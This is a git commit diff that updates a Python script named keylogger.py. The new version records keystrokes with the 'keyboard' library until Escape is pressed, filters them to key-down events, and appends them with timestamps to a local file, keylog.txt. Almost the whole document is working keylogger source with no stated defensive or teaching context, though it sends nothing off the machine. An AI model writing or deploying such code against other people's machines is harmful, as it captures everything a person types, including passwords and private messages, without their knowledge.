300ed45526273619c729ced257fc2ba677a9f8bd
Mateusz Gontarek <92920318+MateuszGontarek@users.noreply.github.com>
2023-02-12 22:07:46 +0100

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,6 +1,22 @@
 import keyboard
+import datetime
 
-recorded = keyboard.record(until='esc', suppress=True)
 
-for i in recorded:
-    print(i)
+def write_to_file(recorded):
+    f = open('keylog.txt', 'a', encoding='utf-8')
+    f.write(str(datetime.datetime.now()) + ': ')
+    for key in recorded:
+        if len(key.name) > 1:
+            if key.name == 'space': 
+                f.write(' ')
+            else:
+                f.write('[' + key.name + ']')
+        else: 
+            f.write(key.name + '')
+    f.write('\n')
+    f.close()
+
+
+recorded = keyboard.record(until='esc')
+recorded = [event for event in recorded if event.event_type == 'down']
+write_to_file(recorded)
